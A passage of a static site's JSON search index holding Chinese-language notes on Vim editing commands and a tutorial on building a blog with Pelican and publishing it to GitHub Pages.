\u5c0f\u5199p\u4ee3\u8868\u8d34\u81f3\u6e38\u6807\u540e\uff08\u4e0b\uff09\uff0c\u56e0\u4e3a\u6e38\u6807\u662f\u5728\u5177\u4f53\u5b57\u7b26\u7684\u4f4d\u7f6e\u4e0a\uff0c\u6240\u4ee5\u5b9e\u9645\u662f\u5728\u8be5\u5b57\u7b26\u7684\u540e\u9762 P \u5927\u5199P\u4ee3\u8868\u8d34\u81f3\u6e38\u6807\u524d\uff08\u4e0a\uff09 \u6574\u884c\u7684\u590d\u5236\u7c98\u8d34\u5728\u6e38\u6807\u7684\u4e0a\uff08\u4e0b\uff09\u4e00\u884c\uff0c\u975e\u6574\u884c\u7684\u590d\u5236\u5219\u662f\u7c98\u8d34\u5728\u6e38\u6807\u7684\u524d\uff08\u540e\uff09","title":"Vim"},{"location":"linux_development/vim/#vim","text":"","title":"Vim"},{"location":"linux_development/vim/#_1","text":"https://blog.csdn.net/qq_42475711/article/details/99646284","title":"\u8df3\u8f6c\u65b9\u5f0f"},{"location":"linux_development/vim/#_2","text":"\u4ece\u5f00\u5934\u641c\u7d22\uff1a\u5728\u547d\u4ee4\u6a21\u5f0f\u4e0b\u8f93\u5165/\u540e\u8ddf\u8981\u67e5\u627e\u7684\u5b57\u7b26\u4e32 \u6309\u4e0b\u56de\u8f66\uff0c\u53ef\u4ee5\u770b\u5230vim\u628a\u5149\u6807\u79fb\u52a8\u5230\u8be5\u5b57\u7b26\u5904 \u518d\u6309n\uff08\u5c0f\u5199\uff09\u67e5\u770b\u4e0b\u4e00\u4e2a\u5339\u914d \u6309N(\u5927\u5199\uff09\u67e5\u770b\u4e0a\u4e00\u4e2a\u5339\u914d\uff08capslock\u5207\u6362\u5927\u5c0f\u5199\uff0c\u4e5f\u53ef\u4ee5\u5728\u5c0f\u5199\u72b6\u6001\u4e0b\u6309shift+n\uff09 \u4ece\u7ed3\u5c3e\u5904\u641c\u7d22\uff1a\uff1f\u8981\u641c\u7d22\u7684\u5b57\u7b26\u4e32\u6216\u5b57\u7b26 \u641c\u7d22\u540e\uff0c\u6253\u5f00\u522b\u7684\u6587\u4ef6\u53d1\u73b0\u4e5f\u88ab\u9ad8\u4eae\u4e86\uff0c\u600e\u4e48\u5173\u95ed \u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b\uff0c\u8f93\u5165\uff1anohlsearch\u6216\u8005\uff1aset nohlsearch \u53ef\u4ee5\u7b80\u5199\u6210noh\u559dset-noh vi/vim \u4e2d\u53ef\u4ee5\u4f7f\u7528 :s \u547d\u4ee4\u6765\u66ff\u6362\u5b57\u7b26\u4e32\u3002\u4ee5\u524d\u53ea\u4f1a\u4f7f\u7528\u4e00\u79cd\u683c\u5f0f\u6765\u5168\u6587\u66ff\u6362\uff0c\u4eca\u5929\u53d1\u73b0\u8be5\u547d\u4ee4\u6709\u5f88\u591a\u79cd\u5199\u6cd5(vi \u771f\u662f\u5f3a\u5927\u554a\uff0c\u8fd8\u6709\u5f88\u591a\u9700\u8981\u5b66\u4e60)\uff0c\u8bb0\u5f55\u51e0\u79cd\u5728\u6b64\uff0c\u65b9\u4fbf\u4ee5\u540e\u67e5\u8be2\u3002 \u66ff\u6362 \u3000\u3000:s/vivian/sky/ \u66ff\u6362\u5f53\u524d\u884c\u7b2c\u4e00\u4e2a vivian \u4e3a sky \u3000\u3000:s/vivian/sky/g \u66ff\u6362\u5f53\u524d\u884c\u6240\u6709 vivian \u4e3a sky \u3000\u3000:n,$s/vivian/sky/ \u66ff\u6362\u7b2c n \u884c\u5f00\u59cb\u5230\u6700\u540e\u4e00\u884c\u4e2d\u6bcf\u4e00\u884c\u7684\u7b2c\u4e00\u4e2a vivian \u4e3a sky \u3000\u3000:n,$s/vivian/sky/g \u66ff\u6362\u7b2c n \u884c\u5f00\u59cb\u5230\u6700\u540e\u4e00\u884c\u4e2d\u6bcf\u4e00\u884c\u6240\u6709 vivian \u4e3a sky \u3000\u3000n \u4e3a\u6570\u5b57\uff0c\u82e5 n \u4e3a .\uff0c\u8868\u793a\u4ece\u5f53\u524d\u884c\u5f00\u59cb\u5230\u6700\u540e\u4e00\u884c \u3000\u3000:%s/vivian/sky/(\u7b49\u540c\u4e8e :g/vivian/s//sky/) \u66ff\u6362\u6bcf\u4e00\u884c\u7684\u7b2c\u4e00\u4e2a vivian \u4e3a sky \u3000\u3000:%s/vivian/sky/g(\u7b49\u540c\u4e8e :g/vivian/s//sky/g) \u66ff\u6362\u6bcf\u4e00\u884c\u4e2d\u6240\u6709 vivian \u4e3a sky \u3000\u3000\u53ef\u4ee5\u4f7f\u7528 # \u4f5c\u4e3a\u5206\u9694\u7b26\uff0c\u6b64\u65f6\u4e2d\u95f4\u51fa\u73b0\u7684 / \u4e0d\u4f1a\u4f5c\u4e3a\u5206\u9694\u7b26 \u3000\u3000:s#vivian/#sky/# \u66ff\u6362\u5f53\u524d\u884c\u7b2c\u4e00\u4e2a vivian/ \u4e3a sky/ \u3000\u3000:%s+/oradata/apras/+/user01/apras1+ (\u4f7f\u7528+ \u6765 \u66ff\u6362 / )\uff1a /oradata/apras/\u66ff\u6362\u6210/user01/apras1/","title":"\u67e5\u627e\u5b57\u7b26\u4e32"},{"location":"linux_development/vim/#_3","text":"set nu\u7684\u4f5c\u7528\u7b49\u540c\u4e8eset number \u5982\u679c\u53ea\u662f\u4e34\u65f6\u663e\u793avim\u7684\u884c\u53f7\uff0c\u53ea\u987b\u6309ESC\u952e\u9000\u51fa\u7f16\u8f91\u5185\u5bb9\u6a21\u5f0f\uff0c\u8f93\u5165\u201c\uff1aset number\u201d\u540e\u6309\u56de\u8f66\u952e\uff0c\u5c31\u53ef\u4ee5\u663e\u793a\u884c\u53f7\u4e86\u3002\u8f93\u5165\u201c\uff1aset nonumber\u201d\u540e\u6309\u56de\u8f66\u952e\uff0c\u5c31\u53ef\u4ee5\u9690\u85cf\u884c\u53f7\u4e86\u3002 \u5982\u679c\u60f3\u8ba9vim\u6c38\u4e45\u663e\u793a\u884c\u53f7\uff0c\u5219\u9700\u8981\u4fee\u6539vim\u914d\u7f6e\u6587\u4ef6vimrc\u3002\u5982\u679c\u6ca1\u6709\u6b64\u6587\u4ef6\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u3002\u5728\u542f\u52a8vim\u65f6\uff0c\u5f53\u524d\u7528\u6237\u6839\u76ee\u5f55\u4e0b\u7684vimrc\u6587\u4ef6\u4f1a\u88ab\u81ea\u52a8\u8bfb\u53d6\uff0c\u56e0\u6b64\u4e00\u822c\u5728\u5f53\u524d\u7528\u6237\u7684\u6839\u76ee\u5f55\u4e0b\u521b\u5efavimrc\u6587\u4ef6\uff0c\u5373\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\uff1a vim ~/.vimrc \u5728\u6253\u5f00\u7684vimrc\u6587\u4ef6\u4e2d\u6700\u540e\u4e00\u884c\u8f93\u5165\uff1aset number \uff0c\u7136\u540e\u4fdd\u5b58\u9000\u51fa\u3002\u518d\u6b21\u7528vim\u6253\u5f00\u6587\u4ef6\u65f6\uff0c\u5c31\u4f1a\u663e\u793a\u884c\u53f7\u4e86\u3002","title":"\u884c\u53f7\u7684\u663e\u793a\u4e0e\u9690\u85cf"},{"location":"linux_development/vim/#_4","text":"\u5f53\u4fdd\u5b58\u51fa\u73b0\u9519\u8bef E212: Can't open file for writing \u539f\u56e0\u662f\u6743\u9650\u4e0d\u591f\uff0c\u666e\u901a\u7528\u6237\u7528vi \u8fdb\u884c\u4e0d\u4e86\u4fdd\u5b58\uff0c\u9700\u8981\u4f7f\u7528\u8d85\u7ea7\u7528\u6237\u624d\u53ef\u4ee5\u3002\u4f46\u662f\u6b64\u65f6\u5df2\u7ecf\u7f16\u8f91\uff0c\u9000\u51fa\u540e\u91cd\u65b0\u4ee5sudo\u6743\u9650\u6253\u5f00\u8fd8\u8981\u91cd\u65b0\u7f16\u8f91\uff0c\u592a\u8fc7\u9ebb\u70e6\u3002\u6b64\u65f6\u9700\u8981\u5728\u547d\u4ee4\u6a21\u5f0f\u8f93\u5165 w ! sudo tee % > /dev/null Which will save the file. \u4f7f\u7528vim\u65f6\uff0c\u5982\u679c\u4f60\u4e0d\u5c0f\u5fc3\u6309\u4e86 Ctrl + s\u540e\uff0c\u4f60\u4f1a\u53d1\u73b0\u4e0d\u80fd\u8f93\u5165\u4efb\u4f55\u4e1c\u897f\u4e86\uff0c\u50cf\u6b7b\u6389\u4e86\u4e00\u822c\u3002\u5176\u5b9evim\u5e76\u6ca1\u6709\u6b7b\u6389\uff0c\u8fd9\u65f6vim\u53ea\u662f\u505c\u6b62\u5411\u7ec8\u7aef\u8f93\u51fa\u800c\u5df2\uff0c\u8981\u60f3\u9000\u51fa\u8fd9\u79cd\u72b6\u6001\uff0c\u53ea\u9700\u6309Ctrl + q \u5373\u53ef\u6062\u590d\u6b63\u5e38\u3002 u \u64a4\u9500\u4e0a\u4e00\u6b65\u7684\u64cd\u4f5c Ctrl+r \u6062\u590d\u4e0a\u4e00\u6b65\u88ab\u64a4\u9500\u7684\u64cd\u4f5c \u5982\u679c\u4f60\u8f93\u5165\u201cu\u201d\u4e24\u6b21\uff0c\u4f60\u7684\u6587\u672c\u6062\u590d\u539f\u6837\uff0c\u90a3\u5e94\u8be5\u662f\u4f60\u7684Vim\u88ab\u914d\u7f6e\u5728Vi\u517c\u5bb9\u6a21\u5f0f\u4e86\u3002","title":"\u4fdd\u5b58\u65f6\u6ca1\u6743\u9650"},{"location":"linux_development/vim/#_5","text":"\u9009\u5b9a\u6587\u672c\u5757\u3002\u4f7f\u7528v\u8fdb\u5165\u53ef\u89c6\u6a21\u5f0f\uff0c\u79fb\u52a8\u5149\u6807\u952e\u9009\u5b9a\u5185\u5bb9\u3002 2.\u590d\u5236\u7684\u547d\u4ee4\u662fy\uff0c\u5373yank\uff08\u63d0\u8d77\uff09 \uff0c\u5e38\u7528\u7684\u547d\u4ee4\u5982\u4e0b\uff1a y \u5728\u4f7f\u7528v\u6a21\u5f0f\u9009\u5b9a\u4e86\u67d0\u4e00\u5757\u7684\u65f6\u5019\uff0c\u590d\u5236\u9009\u5b9a\u5757\u5230\u7f13\u51b2\u533a\u7528\uff1b yy \u590d\u5236\u6574\u884c\uff08nyy\u6216\u8005yny \uff0c\u590d\u5236n\u884c\uff0cn\u4e3a\u6570\u5b57\uff09\uff1b y^ \u590d\u5236\u5f53\u524d\u5230\u884c\u5934\u7684\u5185\u5bb9\uff1b y$ \u590d\u5236\u5f53\u524d\u5230\u884c\u5c3e\u7684\u5185\u5bb9\uff1b yw \u590d\u5236\u4e00\u4e2aword \uff08nyw\u6216\u8005ynw\uff0c\u590d\u5236n\u4e2aword\uff0cn\u4e3a\u6570\u5b57\uff09\uff1b yG \u590d\u5236\u81f3\u6863\u5c3e\uff08nyG\u6216\u8005ynG\uff0c\u590d\u5236\u5230\u7b2cn\u884c\uff0c\u4f8b\u59821yG\u6216\u8005y1G\uff0c\u590d\u5236\u5230\u6863\u5c3e\uff09 \u526a\u5207\u7684\u547d\u4ee4\u662fd\uff0c\u5373delete\uff0cd\u4e0ey\u547d\u4ee4\u57fa\u672c\u7c7b\u4f3c\uff0c\u6240\u4ee5\u4e24\u4e2a\u547d\u4ee4\u7528\u6cd5\u4e00\u6837\uff0c\u5305\u62ec\u542b\u6709\u6570\u5b57\u7684\u7528\u6cd5. d \u526a\u5207\u9009\u5b9a\u5757\u5230\u7f13\u51b2\u533a\uff1b dd \u526a\u5207\u6574\u884c d^ \u526a\u5207\u81f3\u884c\u9996 d$ \u526a\u5207\u81f3\u884c\u5c3e dw \u526a\u5207\u4e00\u4e2aword dG \u526a\u5207\u81f3\u6863\u5c3e \u7c98\u8d34\u7684\u547d\u4ee4\u5f0fp\uff0c\u5373put\uff08\u653e\u4e0b\uff09 p \u5c0f\u5199p\u4ee3\u8868\u8d34\u81f3\u6e38\u6807\u540e\uff08\u4e0b\uff09\uff0c\u56e0\u4e3a\u6e38\u6807\u662f\u5728\u5177\u4f53\u5b57\u7b26\u7684\u4f4d\u7f6e\u4e0a\uff0c\u6240\u4ee5\u5b9e\u9645\u662f\u5728\u8be5\u5b57\u7b26\u7684\u540e\u9762 P \u5927\u5199P\u4ee3\u8868\u8d34\u81f3\u6e38\u6807\u524d\uff08\u4e0a\uff09 \u6574\u884c\u7684\u590d\u5236\u7c98\u8d34\u5728\u6e38\u6807\u7684\u4e0a\uff08\u4e0b\uff09\u4e00\u884c\uff0c\u975e\u6574\u884c\u7684\u590d\u5236\u5219\u662f\u7c98\u8d34\u5728\u6e38\u6807\u7684\u524d\uff08\u540e\uff09","title":"\u590d\u5236\u7c98\u8d34"},{"location":"python/build_blogs_with_pelican/","text":"\u4f7f\u7528Pelican\u642d\u5efa\u535a\u5ba2 \uf0c1 Build blogs with pelican and Github pages. \u521b\u5efaGithub\u4ed3\u5e93 \uf0c1 GitHub\u53ef\u4ee5\u6258\u7ba1\u5404\u79cdgit\u5e93\u7684\u7ad9\u70b9\u3002\u901a\u8fc7 GitHub Pages \u751f\u6210\u7684\u9759\u6001\u7ad9\u70b9\uff0c\u53ef\u4ee5\u514d\u8d39\u6258\u7ba1\u3001\u81ea\u5b9a\u4e49\u4e3b\u9898\u3001\u5e76\u4e14\u81ea\u5236\u7f51\u9875\u754c\u9762\u3002 \u9996\u5148\u5230Github\u8fdb\u884c\u8d26\u53f7\u6ce8\u518c\uff1a https://github.com/ \u3002 \u6ce8\u518c\u540e\u767b\u5f55Github\uff0c\u53f3\u4e0a\u89d2\u70b9\u51fb\u201cCreat a new repo\u201d\uff0c\u8df3\u8f6c\u5230\u65b0\u9875\u9762\u540e\u586b\u5199\u76f8\u5173\u5185\u5bb9\uff0c\u6ce8\u610f\u7248\u672c\u5e93\u540d\u4f7f\u7528'username.github.io'\u7684\u683c\u5f0f\uff0c\u8fd9\u91cc\u5c06 username \u66ff\u6362\u6210\u81ea\u5df1\u7684\u7528\u6237\u540d\u5373\u53ef\u3002 \u8bbe\u7f6e\u548c\u9009\u62e9\u597d\u9875\u9762\u6a21\u677f\u540e\u5c31\u53ef\u4ee5\u751f\u6210\u7136\u540e\u53d1\u5e03\u65b0\u7f51\u9875\u4e86\u3002 \u521b\u5efaSSH\u5bc6\u94a5\u5e76\u4e0a\u4f20\u5230Github\u3002 \u5173\u4e8eSSH\u8ba4\u8bc1\uff1a Windows/Linux/Mac\u4e0b\u4f7f\u7528SSH\u5bc6\u94a5\u8fde\u63a5Github \u5b98\u65b9\u6587\u6863\uff1a Github\u5b98\u65b9\u6587\u6863\u5728\u8fd9\u91cc \u5b89\u88c5Pelican \uf0c1 Pelican \u662f\u4e00\u4e2a\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668\uff0c\u7528 Python \u7f16\u5199\u3002 \u901a\u8fc7\u5728\u9996\u9009\u7ec8\u7aef\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5728 Python 3.6+ \u4e0a\u5b89\u88c5 Pelican\uff08\u5982\u679c\u60a8\u6253\u7b97\u4f7f\u7528\u5b83\uff0c\u8fd8\u53ef\u4ee5\u9009\u62e9 Markdown \uff09\uff1a $ python3 -m pip install \"pelican[markdown]\" \u5b98\u65b9\u6587\u6863\uff1a Pelican\u5b98\u65b9\u6587\u6863 \u5feb\u901f\u914d\u7f6e \uf0c1 \u5c06 username.github.io \u9879\u76ee\u514b\u9686\u5230\u672c\u5730\uff0c\u5207\u6362\u5230\u8be5\u76ee\u5f55 $ git clone git@github.com:username/username.github.io.git $ cd username.github.io \u901a\u8fc7\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u6846\u67b6\u9879\u76ee pelican-quickstart \uff0c\u9996\u5148\u8be2\u95ee\u6709\u5173\u60a8\u7f51\u7ad9\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u5bf9\u4e8e\u62ec\u53f7\u4e2d\u8868\u793a\u9ed8\u8ba4\u503c\u7684\u95ee\u9898\uff0c\u8bf7\u968f\u65f6\u4f7f\u7528 Return \u952e\u63a5\u53d7\u8fd9\u4e9b\u9ed8\u8ba4\u503c\u3002 \u8fd9\u4e9b\u95ee\u9898\u53ea\u662f\u7528\u6765\u751f\u6210\u914d\u7f6e\u6587\u4ef6\u7684\uff0c\u6211\u4eec\u540e\u9762\u90fd\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6765\u624b\u52a8\u4fee\u6539\u8fd9\u4e9b\u8bbe\u7f6e\u3002\u6211\u586b\u5199\u7684\u5185\u5bb9\u5982\u4e0b\uff1a $ pelican-quickstart Welcome to pelican-quickstart v4.7.1. This script will help you create a new Pelican-based website. Please answer the following questions so this script can generate the files needed by Pelican. > Where do you want to create your new web site? [.] > What will be the title of this web site? Jerry\u2018s blog > Who will be the author of this web site? Jerry > What will be the default language of this web site? [en] > Do you want to specify a URL prefix? e.g., https://example.com (Y/n) n > Do you want to enable article pagination? (Y/n) > How many articles per page do you want? [10] > What is your time zone? [Europe/Rome] Asia/Shanghai > Do you want to generate a tasks.py/Makefile to automate generation and publishing? (Y/n) > Do you want to upload your website using FTP? (y/N) > Do you want to upload your website using SSH? (y/N) > Do you want to upload your website using Dropbox? (y/N) > Do you want to upload your website using S3? (y/N) > Do you want to upload your website using Rackspace Cloud Files? (y/N) > Do you want to upload your website using GitHub Pages? (y/N) y > Is this your personal page (username.github.io)? (y/N) y Done. Your new project is available at /home/jerry/Code/Jerry-se.github.io \u56de\u7b54\u5b8c\u6240\u6709\u95ee\u9898\u540e\uff0c\u9879\u76ee\u5c06\u5305\u542b\u4ee5\u4e0b\u5c42\u6b21\u7ed3\u6784\uff08 pages \u9664\u5916- \u663e\u793a\u5728\u4e0b\u9762\u7684\u62ec\u53f7\u4e2d - \u5982\u679c\u60a8\u8ba1\u5212\u521b\u5efa\u975e\u6309\u65f6\u95f4\u987a\u5e8f\u6392\u5217\u7684\u5185\u5bb9\uff0c\u60a8\u53ef\u4ee5\u9009\u62e9\u6dfb\u52a0\u81ea\u5df1\uff09\uff1a yourproject/ \u251c\u2500\u2500 content \u2502 \u2514\u2500\u2500 (pages) \u251c\u2500\u2500 output \u251c\u2500\u2500 tasks.py \u251c\u2500\u2500 Makefile \u251c\u2500\u2500 pelicanconf.py # Main settings file \u2514\u2500\u2500 publishconf.py # Settings to use when ready to publish \u4e0b\u4e00\u6b65\u662f\u5f00\u59cb\u5c06\u5185\u5bb9\u6dfb\u52a0\u5230\u4e3a\u60a8\u521b\u5efa\u7684\u5185\u5bb9\u6587\u4ef6\u5939\u4e2d\u3002 \u521b\u5efa\u6587\u7ae0 \uf0c1 \u5728\u521b\u5efa\u4e00\u4e9b\u5185\u5bb9\u4e4b\u524d\uff0c\u60a8\u65e0\u6cd5\u8fd0\u884c Pelican\u3002\u4f7f\u7528\u60a8\u559c\u6b22\u7684\u6587\u672c\u7f16\u8f91\u5668\u521b\u5efa\u60a8\u7684\u7b2c\u4e00\u7bc7\u6587\u7ae0\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a Title: My super title Date: 2010-12-03 10:20 Modified: 2010-12-05 19:30 Category: Python Tags: pelican, publishing Slug: my-super-post Authors: Alexis Metaireau, Conan Doyle Summary: Short version for index and feeds This is the content of my super blog post. \u9274\u4e8e\u6b64\u793a\u4f8b\u6587\u7ae0\u4e3a Markdown \u683c\u5f0f\uff0c\u8bf7\u5c06\u5176\u53e6\u5b58\u4e3a username.github.io/content/xxxx.md \u5b98\u65b9\u6587\u6863\uff1a Pelican\u5199\u4f5c\u6587\u7ae0 \u751f\u6210\u53d1\u5e03\u7f51\u7ad9 \uf0c1 \u4ece\u60a8\u7684\u9879\u76ee\u6839\u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c pelican \u547d\u4ee4\u4ee5\u751f\u6210\u60a8\u7684\u7ad9\u70b9\uff1a pelican content \u60a8\u7684\u7ad9\u70b9\u73b0\u5df2\u5728 output/ \u76ee\u5f55\u4e2d\u751f\u6210\u3002\uff08\u60a8\u53ef\u80fd\u4f1a\u770b\u5230\u4e0e\u63d0\u8981\u76f8\u5173\u7684\u8b66\u544a\uff0c\u4f46\u5728\u672c\u5730\u5f00\u53d1\u65f6\u8fd9\u662f\u6b63\u5e38\u7684\uff0c\u73b0\u5728\u53ef\u4ee5\u5ffd\u7565\u3002\uff09 \u867d\u7136\u8be5 pelican \u547d\u4ee4\u662f\u751f\u6210\u7ad9\u70b9\u7684\u89c4\u8303\u65b9\u5f0f\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u6765\u7b80\u5316\u751f\u6210\u548c\u53d1\u5e03\u6d41\u7a0b\u3002\u5728 pelican-quickstart \u8fd0\u884c\u8fc7\u7a0b\u4e2d\u63d0\u95ee\u662f\u5426\u8981\u81ea\u52a8\u5316\u7ad9\u70b9\u751f\u6210\u548c\u53d1\u5e03\u3002\u5982\u679c\u5bf9\u8be5\u95ee\u9898\u56de\u7b54\u201c\u662f\u201d\uff0c\u5219\u4f1a\u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e2d\u751f\u6210\u4e00\u4e2a tasks.py \u548c Makefile \u3002\u8fd9\u4e9b\u6587\u4ef6\u9884\u5148\u586b\u5145\u4e86\u4ece pelican-quickstart \u8fc7\u7a0b\u4e2d\u63d0\u4f9b\u7684\u5176\u4ed6\u7b54\u6848\u4e2d\u6536\u96c6\u7684\u67d0\u4e9b\u4fe1\u606f\uff0c\u4f5c\u4e3a\u8d77\u70b9\uff0c\u5e94\u8fdb\u884c\u5b9a\u5236\u4ee5\u9002\u5408\u7684\u7279\u5b9a\u9700\u6c42\u548c\u4f7f\u7528\u6a21\u5f0f\u3002\u5982\u679c\u53d1\u73b0\u8fd9\u4e9b\u81ea\u52a8\u5316\u5de5\u5177\u4e2d\u7684\u4e00\u4e2a\u6216\u4e24\u4e2a\u7684\u5b9e\u7528\u6027\u6709\u9650\uff0c\u5219\u53ef\u4ee5\u968f\u65f6\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5f71\u54cd\u89c4\u8303 pelican \u547d\u4ee4\u7684\u4f7f\u7528\u3002 \u4e0b\u9762\u4ecb\u7ecdPOSIX\u7cfb\u7edf\u4e2d\u4f7f\u7528 make \u6765\u751f\u6210\u548c\u53d1\u5e03\u7f51\u7ad9\uff0c\u60f3\u8981\u5728\u5e7f\u6cdb\u7684\u7cfb\u7edf\u73af\u5883\u4e2d\u4f7f\u7528\uff0c\u8bf7\u53c2\u8003\u6587\u6863\uff0c\u4f7f\u7528\u7531Python\u7f16\u5199\u7684 Invoke \u5de5\u5177\u3002 \u5982\u679c\u8981\u4f7f\u7528 pelicanconf.py \u4e2d\u8bbe\u7f6e\u7684 make \u751f\u6210\u7ad9\u70b9\uff0c\u8bf7\u8fd0\u884c\uff1a make html \u8981\u751f\u6210\u7528\u4e8e\u751f\u4ea7\u7684\u7ad9\u70b9\uff0c\u8bf7\u4f7f\u7528 publishconf.py \u4e2d\u7684\u8bbe\u7f6e\uff0c\u8fd0\u884c\uff1a make publish \u5982\u679c\u60a8\u5e0c\u671b Pelican \u5728\u6bcf\u6b21\u68c0\u6d4b\u5230\u66f4\u6539\u65f6\u81ea\u52a8\u91cd\u65b0\u751f\u6210\u60a8\u7684\u7ad9\u70b9\uff08\u8fd9\u5728\u672c\u5730\u6d4b\u8bd5\u65f6\u5f88\u65b9\u4fbf\uff09\uff0c\u8bf7\u6539\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a make regenerate \u4e3a\u751f\u6210\u7684\u7ad9\u70b9\u63d0\u4f9b\u670d\u52a1\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u7684 http://localhost:8000/ \u8fdb\u884c\u9884\u89c8\uff1a make serve \u901a\u5e38\uff0c\u60a8\u9700\u8981\u5728\u4e24\u4e2a\u5355\u72ec\u7684\u7ec8\u7aef\u4f1a\u8bdd\u4e2d\u8fd0\u884c make regenerate \u548c make serve \uff0c\u4f46\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u540c\u65f6\u8fd0\u884c\u4e24\u8005\uff1a make devserver \u4e0a\u8ff0\u547d\u4ee4\u5c06\u540c\u65f6\u4ee5\u518d\u751f\u6a21\u5f0f\u8fd0\u884c Pelican \u5e76\u5728 http://localhost:8000 \u5904\u63d0\u4f9b\u8f93\u51fa\u3002 \u5f53\u60a8\u51c6\u5907\u597d\u53d1\u5e03\u60a8\u7684\u7f51\u7ad9\u65f6\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u60a8\u5728 pelican-quickstart \u8c03\u67e5\u95ee\u5377\u4e2d\u9009\u62e9\u7684\u65b9\u6cd5\u4e0a\u4f20\u5b83\u3002\u5bf9\u4e8e\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 rsync over ssh\uff1a make rsync_upload \u5b98\u65b9\u6587\u6863\uff1a Pelican\u53d1\u5e03\u7f51\u7ad9 \u53d1\u5e03\u5230Github \uf0c1 GitHub pages \u6709 \u4e24\u79cd\u7c7b\u578b \uff1a \u9879\u76ee\u9875\u9762\u548c\u7528\u6237\u9875\u9762\u3002Pelican \u7ad9\u70b9\u53ef\u4ee5\u53d1\u5e03\u4e3a\u9879\u76ee\u9875\u9762\u548c\u7528\u6237\u9875\u9762\u3002\u53ef\u4ee5\u4f7f\u7528 pip \u5b89\u88c5\u7684\u4f18\u79c0\u7684 ghp-import \u8ba9\u8fd9\u4e2a\u8fc7\u7a0b\u53d8\u5f97\u975e\u5e38\u7b80\u5355\u3002 $ python3 -m pip install ghp-import \u5982\u4e0a\u5728 pelican-quickstart \u4e2d\u8be2\u95ee\u662f\u5426\u4f7f\u7528 Github Pages \u4e0a\u4f20\u60a8\u7684\u7f51\u7ad9\u548c\u662f\u5426\u662f\u60a8\u7684\u4e2a\u4eba\u9875\u9762 <username>.github.io \uff0c\u6211\u9009\u62e9\u4e86\u662f\u3002\u5f53\u6211\u9700\u8981\u5c06 Pelican \u751f\u6210\u7684 output \u4e2d\u7684\u5185\u5bb9\u63a8\u9001\u5230 GitHub \u4e0a\u7684\u5b58\u50a8\u5e93\u7684 master \u5206\u652f\u4e2d\u65f6\uff0c\u53ea\u9700\u8981\u8fd0\u884c\u547d\u4ee4\uff1a make github \u56e0\u4e3a\u6211\u60f3\u5c06\u6587\u7ae0\u548cPelican\u914d\u7f6e\u4e0a\u4f20\u5230Github\u7684\u4e3b\u5206\u652f\u4e0a\uff0c\u5c06\u751f\u6210\u7684\u9875\u9762\u4e0a\u4f20\u5230 gh-pages \u5206\u652f\u4e0a\uff0c\u7136\u540e\u8ba9 Github Pages \u6258\u7ba1\u663e\u793a gh-pages \u5206\u652f\u4e0a\u7684\u7f51\u7ad9\u3002\u6240\u4ee5\u6211\u5c06 Makefile \u6587\u4ef6\u4e2d\u7684\u53d8\u91cf\"GITHUB_PAGES_BRANCH\"\u7684\u503c\u4ece\"main\"\u4fee\u6539\u4e3a\"gh-pages\"\uff0c\u7136\u540e\u8fd0\u884c make github \u3002\u8fd9\u6837\u6211\u7684\u6240\u6709\u6587\u7ae0\u3001Pelican\u548c\u535a\u5ba2\u9875\u9762\u90fd\u653e\u5728 username.github.io \u9879\u76ee\u4e2d\u4e86\u3002 \u6709\u5173\u9879\u76ee\u9875\u9762\u548c\u7528\u6237\u9875\u9762\u7684\u5176\u4ed6\u8bbe\u7f6e\uff0c\u8bf7\u53c2\u8003\uff1a Pelican\u53d1\u5e03\u5230Github pages \u8bbe\u7f6e\u4e3b\u9898 \uf0c1 \u6709\u4e00\u4e2a\u7531\u793e\u533a\u7ba1\u7406\u7684 Pelican \u4e3b\u9898 \u5b58\u50a8\u5e93\uff0c\u4f9b\u4eba\u4eec\u5171\u4eab\u548c\u4f7f\u7528\uff0c\u73b0\u573a\u7248\u672c\u53ef\u4ee5\u5728 http://www.pelicanthemes.com \u770b\u5230\u3002 \u53ef\u4ee5\u5728\u914d\u7f6e\u6587\u4ef6 pelicanconf.py \u4e2d\u8bbe\u7f6e\u4e3b\u9898\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u4e3b\u9898\u6587\u4ef6\u5939\u7684\u76f8\u5bf9\u6216\u7edd\u5bf9\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u662f\u9ed8\u8ba4\u4e3b\u9898\u7684\u540d\u79f0\u6216\u901a\u8fc7 pelican-themes \u5b89\u88c5\u7684\u4e3b\u9898\u3002\u82e5\u8981\u67e5\u8be2\u5df2\u5b89\u88c5\u7684\u4e3b\u9898\uff0c\u8bf7\u4f7f\u7528 pelican-themes -l \u547d\u4ee4\u3002\u4ee5\u4e0b\u662f\u6307\u5b9a\u9996\u9009\u4e3b\u9898\u7684\u793a\u4f8b\u65b9\u6cd5\uff1a # Specify name of a built-in theme THEME = \"notmyidea\" # Specify name of a theme installed via the pelican-themes tool THEME = \"chunk\" # Specify a customized theme, via path relative to the settings file THEME = \"themes/mycustomtheme\" # Specify a customized theme, via absolute path THEME = \"/home/myuser/projects/mysite/themes/mycustomtheme\" \u5185\u7f6e notmyidea \u4e3b\u9898\u53ef\u4ee5\u5f88\u597d\u5730\u5229\u7528\u4ee5\u4e0b\u8bbe\u7f6e\u3002\u4e5f\u53ef\u4ee5\u968f\u610f\u5728\u60a8\u7684\u4e3b\u9898\u4e2d\u4f7f\u7528\u5b83\u4eec\u3002 